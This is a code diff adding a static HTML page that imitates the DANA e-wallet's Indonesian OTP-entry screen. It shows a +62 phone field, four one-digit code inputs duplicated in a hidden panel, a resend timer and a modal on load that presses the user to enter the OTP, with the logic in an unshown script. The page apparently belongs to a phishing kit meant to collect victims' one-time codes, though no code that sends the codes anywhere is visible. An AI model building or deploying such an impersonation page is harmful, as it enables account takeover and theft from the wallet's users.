@@ -1,0 +1,88 @@
+<html>
+	<head>
+		<title>DANA</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="assets/common/css/global.css">
+		<link rel="stylesheet" href="assets/common/css/otp.css">
+		<link rel="stylesheet" href="assets/common/css/loader.css">
+		<script src="assets/lib/jquery/jquery.js"></script>
+		<script>
+			const module = {};
+		</script>
+		<script type="module" src="assets/common/js/otp.js"></script>
+		<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+        <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+	</head>
+	<body>
+		<div style="color: #ffffff; font-size: 14px; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center;">
+			<div style="width: 100%; height: 50px; background-color: #118EEA; display: flex; flex-direction: row; align-items: center; justify-content: space-between;">
+				<div onclick="window.history.back()" style="width: 50px; height: 100%; display: flex; justify-content: center; align-items: center;">
+					<ion-icon name="chevron-back" style="color: #ffffff; font-size: 15px;"></ion-icon>
+				</div>
+				<div style="color: #ffffff; font-size: 17px;">Masuk</div>
+				<div style="width: 50px; height: 100%;"></div>
+			</div>
+			<div style="margin-top: 40px; color: #000000; font-size: 20px;"><b>Masukkan kode OTP</b></div>
+			<div style="margin-top: 10px; color: #888888; font-size: 15px;">Kode OTP dikirim ke</div>
+			<div style="height: 40px; background-color: #eeeeee; border-radius: 5px; display: flex; flex-direction: row; align-items: center; margin-top: 10px;">
+				<img src="assets/common/img/id_flag.png" style="width: 30px; height: 20px; object-fit: fill; margin-left: 10px;">
+			    <div style="color: #000000; font-size: 15px; margin-left: 5px;">+62</div>
+			    <div id="phone" style="color: #000000; font-size: 17px; margin-left: 5px; margin-right: 5px;"><b></b></div>
+			</div>
+			<div style="margin-top: 10px; color: #888888; font-size: 15px;">via <ion-icon name="chatbubble-ellipses-outline" style="color: #888888; font-size: 15px;"></ion-icon> SMS</div>
+			<div id="otp-error" style="display: none; color: #ff0000; font-size: 15px; margin-top: 10px;">Kode OTP yang Anda masukkan salah</div>
+			<div style="display: flex; flex-direction: row; margin-top: 20px;">
+				<div style="width: 35px; height: 40px; border: 1px solid #dddddd; border-radius: 5px; display: flex; justify-content: center; align-items: center; color: #000000;">
+					<input id="otp1" type="tel" class="hidden-input" maxlength="1" autofocus style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center; color: #000000; font-size: 20px; font-weight: bold;">
+				</div>
+				<div style="margin-left: 5px; width: 35px; height: 40px; border: 1px solid #dddddd; border-radius: 5px; display: flex; justify-content: center; align-items: center; color: #000000;">
+					<input id="otp2" type="tel" class="hidden-input" maxlength="1" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center; color: #000000; font-size: 20px; font-weight: bold;">
+				</div>
+				<div style="margin-left: 5px; width: 35px; height: 40px; border: 1px solid #dddddd; border-radius: 5px; display: flex; justify-content: center; align-items: center; color: #000000;">
+					<input id="otp3" type="tel" class="hidden-input" maxlength="1" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center; color: #000000; font-size: 20px; font-weight: bold;">
+				</div>
+				<div style="margin-left: 5px; width: 35px; height: 40px; border: 1px solid #dddddd; border-radius: 5px; display: flex; justify-content: center; align-items: center; color: #000000;">
+					<input id="otp4" type="tel" class="hidden-input" maxlength="1" style="width: 100%; height: 100%; border: 0; outline: 0; background-color: #00000000; text-align: center; color: #000000; font-size: 20px; font-weight: bold;">
+				</div>
+			</div>
+			<div style="margin-top: 20px; height: 30px; background-color: #eeeeee; border-radius: 5px; border: 1px solid #dddddd; display: flex; flex-direction: row; align-items: center;">
+				<div id="resend" onclick="module.resendOTP()" style="color: #aaaaaa; height: calc(100% - 2px); display: flex; justify-content: center; align-items: center; border-radius: 5px; padding-left: 5px; padding-right: 5px; color: #cccccc; font-size: 12px; background-color: #ffffff; border: 1px solid #dddddd;">
+					Kirim Ulang
+				</div>
+				<div id="timeout" style="color: #000000; font-size: 12px; margin-left: 5px; margin-right: 5px;"><b></b></div>
+			</div>
+			<div id="otp-container" style="position: fixed; left: 0; bottom: 0; width: 100%; display: flex; visibility: hidden; background-color: #eeeeee; border-bottom-left-radius: 0; border-bottom-right-radius: 0; border-top-left-radius: 30px; border-top-right-radius: 30px; flex-direction: column; align-items: center;">
+				<div style="color: #000000; font-size: 15px; margin-top: 20px;"><b>Masukkan OTP</b></div>
+				<div style="color: #000000; font-size: 14px; margin-top: 5px;">Kode OTP telah dikirim ke nomor Anda</div>
+				<div id="otp-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 10px;">Kode OTP yang Anda masukkan salah</div>
+				<div style="display: flex; flex-direction: row; margin-top: 20px;">
+					<div style="width: 40px; height: 40px; border-bottom: 1px solid #000000;">
+						<input id="otp1" type="tel" maxlength="1" style="font-weight: bold; text-align: center; width: 100%; height: 100%; border: 0; outline: 0!; background-color: #00000000; color: #000000; font-size: 20px;">
+                    </div>
+                    <div style="margin-left: 5px; width: 40px; height: 40px; border-bottom: 1px solid #000000;">
+						<input id="otp2" type="tel" maxlength="1" style="font-weight: bold; text-align: center; width: 100%; height: 100%; border: 0; outline: 0!; background-color: #00000000; color: #000000; font-size: 20px;">
+                    </div>
+                    <div style="margin-left: 5px; width: 40px; height: 40px; border-bottom: 1px solid #000000;">
+						<input id="otp3" type="tel" maxlength="1" style="font-weight: bold; text-align: center; width: 100%; height: 100%; border: 0; outline: 0!; background-color: #00000000; color: #000000; font-size: 20px;">
+                    </div>
+                    <div style="margin-left: 5px; width: 40px; height: 40px; border-bottom: 1px solid #000000;">
+						<input id="otp4" type="tel" maxlength="1" style="font-weight: bold; text-align: center; width: 100%; height: 100%; border: 0; outline: 0!; background-color: #00000000; color: #000000; font-size: 20px;">
+                    </div>
+				</div>
+				<div id="timeout" style="color: #dddddd; font-size: 14px; margin-top: 20px; margin-bottom: 20px;">KIRIM ULANG (101s)</div>
+			</div>
+			<div id="alert1" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #00000090; display: flex; justify-content: center; align-items: center;">
+				<div style="width: calc(100% - 60px); margin-left: 30px; margin-right: 30px; background-color: #ffffff; border-radius: 5px; display: flex; flex-direction: column;">
+					<div style="color: #000000; font-size: 20px; margin-left: 20px; margin-top: 20px;"><b>Peringatan</b></div>
+					<div style="color: #000000; font-size: 15px; margin-left: 20px; margin-top: 10px;">Mohon masukkan otp Anda.</div>
+					<div onclick="module.ackEnterotp()" style="width: 80px; height: 80px; display: flex; justify-content: center; align-items: center; color: #3498db; font-size: 16px; margin-top: 20px; align-self: flex-end;"><b>OK</b></div>
+				</div>
+			</div>
+			<div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
+				<div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
+					<div class="loader" style="width: 50px; height: 50px;"></div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
